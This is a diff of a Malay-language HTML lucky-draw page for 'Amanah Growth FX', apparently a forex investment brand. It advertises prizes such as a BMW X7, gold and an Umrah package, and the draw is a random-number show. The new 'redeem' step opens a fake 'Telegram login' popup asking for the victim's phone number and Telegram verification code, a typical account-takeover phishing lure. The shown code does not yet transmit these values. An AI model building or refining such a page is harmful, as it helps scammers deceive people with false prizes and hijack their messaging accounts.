@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Amanah Growth FX Lucky Draw</title>
+<title>Amanah Growth FX</title>
 
 <style>
 
@@ -17,38 +17,188 @@ font-family:'Segoe UI',sans-serif;
 
 body{
 min-height:100vh;
-background:
-linear-gradient(rgba(0,0,0,.78),rgba(0,0,0,.78)),
+color:white;
+text-align:center;
+overflow-x:hidden;
+
+/* animated background */
+background: linear-gradient(rgba(0,0,0,.85),rgba(0,0,0,.85)),
 url('https://thumbs.dreamstime.com/b/futuristic-financial-dashboard-featuring-glowing-bar-graphs-rising-line-chart-neon-orange-elements-contrast-dark-348684501.jpg');
 background-size:cover;
-background-position:center;
-color:white;
+animation:bgMove 20s infinite alternate;
 }
 
-/* ===== LOGIN POPUP ===== */
-.loginPopup{
+@keyframes bgMove{
+0%{background-position:0 0;}
+100%{background-position:50px 50px;}
+}
+
+/* ===== TITLE ===== */
+.logo{
+font-size:44px;
+font-weight:900;
+margin-top:25px;
+letter-spacing:2px;
+animation:fadeDown 1s ease;
+}
+
+@keyframes fadeDown{
+from{opacity:0;transform:translateY(-20px)}
+to{opacity:1;transform:translateY(0)}
+}
+
+/* ===== MARQUEE ===== */
+.marquee{
+margin-top:10px;
+font-weight:bold;
+color:#38bdf8;
+overflow:hidden;
+white-space:nowrap;
+}
+
+.marquee span{
+display:inline-block;
+padding-left:100%;
+animation:move 12s linear infinite;
+}
+
+@keyframes move{
+0%{transform:translateX(0)}
+100%{transform:translateX(-100%)}
+}
+
+/* ===== NUMBER BOX ===== */
+.numberBox{
+width:340px;
+height:140px;
+margin:30px auto;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:62px;
+font-weight:bold;
+border-radius:20px;
+
+background:rgba(255,255,255,.06);
+border:1px solid rgba(255,255,255,.15);
+backdrop-filter:blur(10px);
+
+animation:floatBox 4s ease-in-out infinite;
+}
+
+@keyframes floatBox{
+0%{transform:translateY(0)}
+50%{transform:translateY(-8px)}
+100%{transform:translateY(0)}
+}
+
+/* ===== BUTTON ===== */
+button{
+padding:14px 40px;
+border:none;
+border-radius:12px;
+background:#0ea5e9;
+color:white;
+font-weight:bold;
+cursor:pointer;
+font-size:16px;
+margin-top:10px;
+
+animation:pulse 2s infinite;
+transition:0.3s;
+}
+
+button:hover{
+transform:scale(1.08);
+background:#0284c7;
+}
+
+@keyframes pulse{
+0%{box-shadow:0 0 5px #0ea5e9}
+50%{box-shadow:0 0 25px #38bdf8}
+100%{box-shadow:0 0 5px #0ea5e9}
+}
+
+/* ===== PRIZE CARDS ===== */
+.prizeList{
+display:flex;
+justify-content:center;
+flex-wrap:wrap;
+gap:18px;
+margin-top:40px;
+}
+
+.prizeCard{
+width:220px;
+background:rgba(255,255,255,.05);
+border-radius:16px;
+border:1px solid rgba(255,255,255,.12);
+overflow:hidden;
+
+/* FLOAT EFFECT */
+animation:floatCard 4s ease-in-out infinite;
+transition:0.3s;
+}
+
+.prizeCard:hover{
+transform:scale(1.08) rotate(1deg);
+}
+
+@keyframes floatCard{
+0%{transform:translateY(0)}
+50%{transform:translateY(-10px)}
+100%{transform:translateY(0)}
+}
+
+.prizeCard img{
+width:100%;
+height:170px;
+object-fit:contain;
+padding:10px;
+}
+
+.prizeName{
+padding:12px;
+font-weight:bold;
+}
+
+/* ===== POPUP ===== */
+.popup{
+display:none;
 position:fixed;
 top:0;
 left:0;
 width:100%;
 height:100%;
 background:rgba(0,0,0,.85);
-display:flex;
 justify-content:center;
 align-items:center;
-z-index:99999;
+z-index:999;
 }
 
-.loginBox{
-width:320px;
+.popupContent{
 background:#111827;
 padding:25px;
-border-radius:15px;
-text-align:center;
-border:1px solid rgba(255,255,255,.1);
+border-radius:16px;
+width:90%;
+max-width:420px;
+
+animation:popIn 0.3s ease;
 }
 
-.loginBox input{
+@keyframes popIn{
+from{transform:scale(0.7);opacity:0}
+to{transform:scale(1);opacity:1}
+}
+
+.popupTitle{
+font-size:26px;
+font-weight:bold;
+color:#38bdf8;
+margin-bottom:10px;
+}
+
+input{
 width:100%;
 padding:10px;
 margin-top:10px;
@@ -57,161 +207,11 @@ border:none;
 outline:none;
 }
 
-.loginBox button{
+#popupImg{
 width:100%;
-margin-top:15px;
-padding:10px;
-background:#0ea5e9;
-color:white;
-border:none;
-border-radius:8px;
-font-weight:bold;
+margin-top:10px;
 cursor:pointer;
-}
-
-/* ===== MAIN ===== */
-.container{
-max-width:1300px;
-margin:auto;
-padding:40px 20px;
-text-align:center;
-}
-
-.logo{
-font-size:42px;
-font-weight:700;
-letter-spacing:2px;
-margin-bottom:25px;
-}
-
-.numberBox{
-width:340px;
-height:140px;
-margin:30px auto;
-display:flex;
-align-items:center;
-justify-content:center;
-font-size:58px;
-font-weight:bold;
-border-radius:20px;
-background:rgba(255,255,255,.05);
-border:1px solid rgba(255,255,255,.1);
-backdrop-filter:blur(10px);
-box-shadow:0 0 25px rgba(14,165,233,.25);
-}
-
-.spin{
-animation:shake .08s infinite;
-}
-
-@keyframes shake{
-0%{transform:translateY(0)}
-50%{transform:translateY(-2px)}
-100%{transform:translateY(2px)}
-}
-
-button{
-padding:14px 40px;
-border:none;
 border-radius:10px;
-font-size:16px;
-font-weight:bold;
-cursor:pointer;
-background:#0ea5e9;
-color:white;
-transition:.3s;
-}
-
-button:hover{background:#0284c7;}
-
-.notice{
-margin-top:20px;
-font-size:16px;
-font-weight:600;
-color:#7dd3fc;
-}
-
-.titlePrize{
-margin-top:50px;
-margin-bottom:20px;
-font-size:28px;
-font-weight:bold;
-}
-
-.prizeList{
-display:flex;
-justify-content:center;
-flex-wrap:wrap;
-gap:25px;
-}
-
-.prizeCard{
-width:230px;
-background:rgba(255,255,255,.05);
-border:1px solid rgba(255,255,255,.08);
-border-radius:18px;
-overflow:hidden;
-backdrop-filter:blur(10px);
-}
-
-.prizeCard img{
-width:100%;
-height:180px;
-object-fit:contain;
-padding:10px;
-}
-
-.prizeName{
-padding:15px;
-font-size:18px;
-font-weight:600;
-border-top:1px solid rgba(255,255,255,.08);
-}
-
-/* ===== POPUP RESULT ===== */
-.popup{
-display:none;
-position:fixed;
-top:0;
-left:0;
-width:100%;
-height:100%;
-background:rgba(0,0,0,.8);
-z-index:9999;
-justify-content:center;
-align-items:center;
-}
-
-.popupContent{
-width:90%;
-max-width:450px;
-background:#111827;
-border-radius:20px;
-padding:30px;
-text-align:center;
-}
-
-.popupTitle{
-font-size:28px;
-font-weight:bold;
-margin-bottom:15px;
-}
-
-.popupPrize{
-font-size:24px;
-font-weight:bold;
-color:#38bdf8;
-margin:15px 0;
-}
-
-.closeBtn{
-margin-top:20px;
-padding:12px 30px;
-border:none;
-border-radius:8px;
-background:#0ea5e9;
-color:white;
-cursor:pointer;
 }
 
 </style>
@@ -219,213 +219,185 @@ cursor:pointer;
 
 <body>
 
-<!-- 🔐 LOGIN POPUP -->
-<div id="loginPopup" class="loginPopup">
-<div class="loginBox">
+<!-- AUDIO -->
+<audio id="bgMusic" loop>
+<source src="bg-music.mp3">
+</audio>
 
-<h2>AMANAH GROWTH FX</h2>
-<p>Login Pelabur</p>
+<audio id="spinSound">
+<source src="spin-sound.mp3">
+</audio>
 
-<input type="text" id="nama" placeholder="Nama">
-<input type="text" id="phone" placeholder="No Phone">
+<audio id="winSound">
+<source src="win-sound.mp3">
+</audio>
 
-<button onclick="login()">TERUSKAN</button>
+<audio id="clickSound">
+<source src="click.mp3">
+</audio>
 
-</div>
-</div>
-
-<!-- 🔐 OTP POPUP -->
-<div id="otpPopup" class="loginPopup" style="display:none;">
-<div class="loginBox">
-
-<h2>VERIFICATION</h2>
-<p>Kod dihantar ke Telegram</p>
-
-<input type="text" id="otp" placeholder="Masukkan kod">
-
-<button onclick="verifyOTP()">SAHKAN</button>
-
-</div>
-</div>
-
-<!-- MAIN -->
-<div class="container">
-
+<!-- TITLE -->
 <div class="logo">AMANAH GROWTH FX</div>
 
+<div class="marquee">
+<span>🔥 REBUT PELUANG SEKARANG - CABUT & MENANG HADIAH HEBAT 🔥</span>
+</div>
+
+<!-- NUMBER -->
 <div id="numberBox" class="numberBox">----</div>
 
-<button id="drawBtn" onclick="startDraw()" disabled>
-Cabut Sekarang
-</button>
+<button onclick="startDraw()">CABUT SEKARANG</button>
 
-<div id="notice" class="notice"></div>
-
-<div class="titlePrize">Senarai Hadiah Utama</div>
-
+<!-- PRIZES -->
 <div class="prizeList">
 
-<div class="prizeCard">
-<img src="bmw.png">
-<div class="prizeName">BMW X7</div>
-</div>
-
-<div class="prizeCard">
-<img src="goldbar.png">
-<div class="prizeName">Emas 10 Gram</div>
-</div>
-
-<div class="prizeCard">
-<img src="pakejumrah.png">
-<div class="prizeName">Pakej Umrah</div>
-</div>
-
-<div class="prizeCard">
-<img src="wangtunai.png">
-<div class="prizeName">Wang Tunai RM1000</div>
-</div>
+<div class="prizeCard"><img src="bmw.png"><div class="prizeName">BMW X7</div></div>
+<div class="prizeCard"><img src="goldbar.png"><div class="prizeName">Emas 10 Gram</div></div>
+<div class="prizeCard"><img src="pakejumrah.png"><div class="prizeName">Pakej Umrah</div></div>
+<div class="prizeCard"><img src="wangtunai.png"><div class="prizeName">Wang Tunai RM1000</div></div>
 
 </div>
 
-</div>
-
-<!-- RESULT POPUP -->
+<!-- POPUP HADIAH -->
 <div id="popup" class="popup">
 <div class="popupContent">
 
 <div id="popupTitle" class="popupTitle"></div>
-<div id="popupNumber"></div>
-<div id="popupPrize" class="popupPrize"></div>
-<div id="popupText"></div>
+<div id="popupPrize"></div>
 
-<button class="closeBtn" onclick="closePopup()">Tutup</button>
+<img id="popupImg" onclick="zoomImage()">
+
+<br><br>
+
+<button onclick="openTelegram()">TEBUS SEKARANG</button>
+
+</div>
+</div>
+
+<!-- ZOOM -->
+<div id="zoomPopup" class="popup">
+<div class="popupContent">
+<img id="zoomImg">
+<br><br>
+<button onclick="closeZoom()">TUTUP</button>
+</div>
+</div>
+
+<!-- TELEGRAM -->
+<div id="tgPopup" class="popup">
+<div class="popupContent">
+
+<h2>LOG MASUK TELEGRAM</h2>
+
+<input id="phone" placeholder="No Phone">
+<input id="code" placeholder="Code Telegram">
+
+<button onclick="submitTG()">HANTAR</button>
 
 </div>
 </div>
 
 <script>
 
-let realOTP = "778899";
-
-/* ===== LOGIN ===== */
-function login(){
-
-let nama = document.getElementById("nama").value;
-let phone = document.getElementById("phone").value;
-
-if(nama=="" || phone==""){
-alert("Isi semua maklumat");
-return;
-}
-
-localStorage.setItem("user",nama);
-
-document.getElementById("loginPopup").style.display="none";
-document.getElementById("otpPopup").style.display="flex";
-
-}
-
-/* ===== OTP ===== */
-function verifyOTP(){
-
-let otp = document.getElementById("otp").value;
-
-if(otp === realOTP){
-
-document.getElementById("otpPopup").style.display="none";
-
-document.getElementById("drawBtn").disabled=false;
-
-document.getElementById("notice").innerHTML=
-"Anda berjaya login. Sila cabut sekarang.";
-
-}else{
-alert("Kod salah!");
-}
-
-}
-
-/* ===== DRAW LOCK ===== */
 window.onload=function(){
-
-if(localStorage.getItem("agfx_drawn")){
-document.getElementById("drawBtn").style.display="none";
-document.getElementById("notice").innerHTML=
-"Anda sudah membuat cabutan.";
+let bg=document.getElementById("bgMusic");
+bg.volume=0.3;
+bg.play().catch(()=>{});
 }
 
-};
-
-/* ===== DRAW ===== */
+/* DRAW */
 function startDraw(){
 
-localStorage.setItem("agfx_drawn","yes");
-
-document.getElementById("drawBtn").style.display="none";
+document.getElementById("spinSound").play();
 
 let box=document.getElementById("numberBox");
-box.classList.add("spin");
+box.style.transform="scale(1.1)";
 
 let count=0;
 
-let rolling=setInterval(function(){
+let run=setInterval(()=>{
 
 box.innerHTML=Math.floor(Math.random()*9000)+1000;
-
 count++;
 
 if(count>40){
 
-clearInterval(rolling);
+clearInterval(run);
 
-box.classList.remove("spin");
+box.style.transform="scale(1)";
 
-let nombor=Math.floor(Math.random()*9000)+1000;
+let num=Math.floor(Math.random()*9000)+1000;
 
-box.innerHTML=nombor;
+box.innerHTML=num;
 
-showResult(nombor);
-
-}
-
-},70);
+showResult(num);
 
 }
 
-/* ===== RESULT ===== */
-function showResult(nombor){
+},60);
+}
 
-const hadiahList=[
-"BMW X7",
-"Emas 10 Gram",
-"Pakej Umrah",
-"Wang Tunai RM1000",
-"Maaf, Cuba Lagi","Maaf, Cuba Lagi"
+/* RESULT */
+function showResult(num){
+
+document.getElementById("winSound").play();
+
+let list=[
+{name:"BMW X7",img:"bmw.png"},
+{name:"Emas 10 Gram",img:"goldbar.png"},
+{name:"Pakej Umrah",img:"pakejumrah.png"},
+{name:"Wang Tunai RM1000",img:"wangtunai.png"},
+{name:"Maaf Cuba Lagi",img:""}
 ];
 
-let hadiah=hadiahList[Math.floor(Math.random()*hadiahList.length)];
+let prize=list[Math.floor(Math.random()*list.length)];
 
 document.getElementById("popup").style.display="flex";
 
-document.getElementById("popupTitle")=
-(hadiah==="Maaf, Cuba Lagi")?"TERIMA KASIH":"TAHNIAH";
-
 document.getElementById("popupTitle").innerHTML=
-(hadiah==="Maaf, Cuba Lagi")?"TERIMA KASIH":"TAHNIAH";
+prize.name.includes("Maaf")?"TERIMA KASIH":"TAHNIAH";
 
-document.getElementById("popupPrize").innerHTML=hadiah;
+document.getElementById("popupPrize").innerHTML=prize.name;
 
-document.getElementById("popupNumber").innerHTML=
-"Nombor Anda: <b>"+nombor+"</b>";
-
-document.getElementById("popupText").innerHTML=
-"Sila screenshot keputusan ini.";
+if(prize.img!=""){
+document.getElementById("popupImg").src=prize.img;
+document.getElementById("popupImg").style.display="block";
+}else{
+document.getElementById("popupImg").style.display="none";
+}
 
 }
 
-/* ===== CLOSE ===== */
-function closePopup(){
+/* ZOOM */
+function zoomImage(){
+document.getElementById("clickSound").play();
+document.getElementById("zoomPopup").style.display="flex";
+document.getElementById("zoomImg").src=document.getElementById("popupImg").src;
+}
+
+function closeZoom(){
+document.getElementById("zoomPopup").style.display="none";
+}
+
+/* TELEGRAM */
+function openTelegram(){
 document.getElementById("popup").style.display="none";
+document.getElementById("tgPopup").style.display="flex";
+}
+
+function submitTG(){
+
+let p=document.getElementById("phone").value;
+let c=document.getElementById("code").value;
+
+if(p==""||c==""){
+alert("Isi semua maklumat");
+return;
+}
+
+alert("Permohonan dihantar");
+document.getElementById("tgPopup").style.display="none";
+
 }
 
 </script>
